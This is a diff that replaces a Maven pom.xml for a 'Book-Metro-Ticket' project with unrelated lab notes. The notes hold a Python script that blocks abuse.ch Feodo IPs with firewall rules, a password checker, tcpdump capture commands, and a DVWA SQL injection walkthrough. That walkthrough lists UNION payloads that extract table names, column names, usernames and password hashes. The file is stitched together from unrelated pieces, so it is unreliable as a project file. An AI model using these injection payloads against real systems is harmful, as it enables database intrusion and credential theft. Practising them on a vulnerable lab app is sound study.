@@ -1,26 +1,114 @@
-<project xmlns="http://maven.apache.org/POM/4.0.0"
-         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
-         xsi:schemaLocation="http://maven.apache.org/POM/4.0.0
-                             http://maven.apache.org/xsd/maven-4.0.xsd"> 
-    <modelVersion>4.0.0</modelVersion> 
-    <groupId>com.library</groupId> 
-    <artifactId>Book-Metro-Ticket</artifactId> 
-    <version>1.0SNAPSHOT</version> 
-    <packaging>war</packaging> 
+import requests, csv, subprocess 
+# source: Abuse CH 
+response = requests.get( 
+"https://feodotracker.abuse.ch/downloads/ipblocklist.csv" 
+).text 
+rule = 'netsh advfirewall firewall delete rule name="BadIP"' 
+subprocess.run(["PowerShell", "-Command", rule]) 
+mycsv = csv.reader( 
+filter(lambda x: not x.startswith("#"), response.splitlines()) 
+) 
+for row in mycsv: 
+ip = row[1] 
+if ip != "dst_ip": 
+print("Added Rule to block:", ip) 
+rule = "netsh advfirewall firewall add rule name='BadIP' Dir=Out Action=Block RemoteIP=" + ip 
+subprocess.run(["PowerShell", "-Command", rule])
 
-    <dependencies>
-        <!-- Servlet API -->
-        <dependency>
-            <groupId>javax.servlet</groupId>
-            <artifactId>javax.servlet-api</artifactId>
-            <version>4.0.1</version> 
-            <scope>provided</scope> 
-        </dependency>
+----------------------------------------------------------------------------------------------------------
+def is_valid_password(password):
 
-               
-    </dependencies>
+    # Minimum 8 characters
+    if len(password) < 8:
+        return False
 
-    <build>
-        <finalName>BookMetroTicket</finalName>
-    </build>
-</project>
+    has_digit = False
+    has_upper = False
+    has_lower = False
+    has_special = False
+
+    for ch in password:
+
+        if ch.isdigit():
+            has_digit = True
+
+        elif ch.isupper():
+            has_upper = True
+
+        elif ch.islower():
+            has_lower = True
+
+        else:
+            has_special = True
+
+    return has_digit and has_upper and has_lower and has_special
+
+
+password = input("Enter password: ")
+
+if is_valid_password(password):
+    print("Valid Password")
+else:
+    print("Invalid Password")
+    print("Password must contain:")
+    print("- Minimum 8 characters")
+    print("- At least one digit")
+    print("- At least one uppercase letter")
+    print("- At least one lowercase letter")
+    print("- At least one special character")
+
+
+---------------------------------------------------------------------
+
+python3 -m http.server 8080 
+sudo tcpdump -i any -w capture.pcap port 8080
+
+-----------------------------------------------------------------------
+sudo nano /etc/dvwa/config/config.inc.php
+
+14. Basic SQL Injection
+
+Input:
+
+1' OR '1'='1
+
+
+15. Find Number of Columns
+
+Try one by one:
+
+1' ORDER BY 1-- -
+1' ORDER BY 2-- -
+1' ORDER BY 3-- -
+
+Stop when error occurs.
+
+Last successful number = total columns.
+
+
+16. UNION Injection Test
+1' UNION SELECT 1,2-- -
+
+
+17. Extract Database Name
+1' UNION SELECT database(),2-- -
+
+
+18. Extract Table Names
+1' UNION SELECT table_name,2 
+FROM information_schema.tables 
+WHERE table_schema=database()-- -
+
+
+19. Extract Column Names
+1' UNION SELECT column_name,2 
+FROM information_schema.columns 
+WHERE table_name='users'-- -
+
+
+20. Extract Usernames and Password Hashes
+1' UNION SELECT user,password FROM users-- -
+
+----------------------------------------------------------------------------
+
+
